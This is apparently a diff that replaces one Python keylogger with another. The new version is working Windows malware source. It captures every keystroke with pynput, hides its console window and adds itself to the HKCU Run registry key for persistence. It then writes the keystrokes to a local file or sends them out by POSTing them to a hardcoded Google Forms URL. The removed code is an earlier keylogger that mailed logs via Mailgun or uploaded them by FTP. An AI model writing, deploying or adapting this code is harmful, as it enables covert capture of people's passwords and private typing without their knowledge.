@@ -1,48 +1,112 @@
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
 import os
-import Logger
+import sys
+import threading
+import urllib,urllib3
+import urllib.request
+import smtplib
+import ftplib
+import datetime,time
 
-METHOD = 0				# This defines the method the keylogger will send the logs
-					# Use 0 for sending an email and 1 for uploading to ftp
+from pynput.keyboard import Key, Listener
+import logging
 
-# If you are using 0 as method ( EMAIL ) and ignore the FTP part
-RECIPIENT_EMAILS = ["recipient@*.*"] # Must be authorized by you on mailgun (Manage Authorized recipients on the control panel)
-MAILGUN_API_KEY = "key-XXXXXXXXXXXXXXXXXXXXXXXXXXX" # Get it on http://www.mailgun.com/
-MAILGUN_DOMAIN_NAME = "sandboxXXXXXXXXXXXXXXXXXXXXXXXX.mailgun.org" # Get it on http://www.mailgun.com/
+#Disallowing Multiple Instance
+import win32event, win32api, winerror
+from winreg import *
+mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
+if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
+    mutex = None
+    print("Multiple Instance not Allowed")
+    exit(0)
 
-# If you are using 1 as method ( FTP ) and ignore the EMAIL part
-FTPHOST = "ftp.yourhost.com"
-FTPUSER = "ftpuser"
-FTPPASS = "ftppass"
 
-"""
-IMPORTANT:
+x=''
+data=''
+count=0
 
-If you decide to use a ftp upload method you need to change the constructor that way:
+#Hide Console
+def hide():
+    import win32console,win32gui
+    window = win32console.GetConsoleWindow()
+    win32gui.ShowWindow(window,0)
+    return True
 
-Lg = Logger.posixLogger(METHOD,FTPUSER,FTPPASS,None,deflogfile,FTPHOST)
+def msg():
+    print("""\n
+        usage:main.py mode [optional:startup]
+        mode:
+            local: store the logs in a file [keylogs.txt]     
+            remote: send the logs to a Google Form. You must specify the Form URL and Field Name in the script. """)
+    return True
 
-or for windows
+# Add to startup
+def addStartup():
+    fp=os.path.dirname(os.path.realpath(__file__))
+    file_name=sys.argv[0].split("\\")[-1]
+    new_file_path=fp+"\\"+file_name
+    keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'
 
-Lg = Logger.ntLogger(METHOD,FTPUSER,FTPPASS,None,deflogfile,FTPHOST)
-"""
+    key2change= OpenKey(HKEY_CURRENT_USER,keyVal,0,KEY_ALL_ACCESS)
 
+    SetValueEx(key2change, "Keylogger",0,REG_SZ, new_file_path)
+
+#Local Keylogger
+def local():
+    global data
+    if len(data)>100:
+        fp=open("keylogs.txt","a")
+        fp.write(data)
+        fp.close()
+        data=''
+    return True
+
+#Remote Google Form logs post
+def remote():
+    global data
+    if len(data)>100:
+        url="https://docs.google.com/forms/u/0/d/e/1FAIpQLSfl08hwL-Kv0pRfhmeaJWWA5sOK8C1psyClLR4gJlLYt-SY5w/formResponse" #Specify Google Form URL here
+        klog={'entry.366340186':data} #Specify the Field Name here
+        try:
+            dataenc=urllib.parse.urlencode(klog).encode("utf-8")
+            req=urllib.request.Request(url)
+            response=urllib.request.urlopen(req, data=dataenc)
+            data=''
+        except Exception as e:
+            print(e)
+    return True
+ 
 def main():
-	# Defining a log file path
-	if os.name == 'posix':					# If i'm on linux
-        	deflogfile = os.getcwd()+"/.system.c"
-	elif os.name == 'nt':					# If i'm on windows
-        	temp_path = os.getenv('TEMP')			# Retrive TEMP directory
-        	deflogfile = temp_path+"\system.c"
-
-	if os.name == 'posix':				# Create a linux logger instance
-		Lg = Logger.posixLogger(METHOD,MAILGUN_API_KEY,MAILGUN_DOMAIN_NAME,RECIPIENT_EMAILS,deflogfile)
-	elif os.name == 'nt':				# Create a windows logger instance
-		Lg = Logger.ntLogger(METHOD,MAILGUN_API_KEY,MAILGUN_DOMAIN_NAME,RECIPIENT_EMAILS,deflogfile)
-
-	# Start the keylogger
-	Lg.startLogging()
+    global x
+    if len(sys.argv)==1:
+        msg()
+        exit(0)
+    else:
+        if sys.argv[1]=="local":
+            x=1
+            hide()
+        elif sys.argv[1]=="remote":
+            x=2
+            hide() 
+        else:
+            msg()
+            exit(0)
+    return True
 
 if __name__ == '__main__':
-	main()
+    main() 
+
+def on_press(key):
+    global x,data
+    if(str(key).lower()=="key.esc") :
+        return False
+    data = data + str(key)
+    if x==1:  
+        local()
+    elif x==2:
+        remote() 
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
+
+    # data=data+keys 
+ 
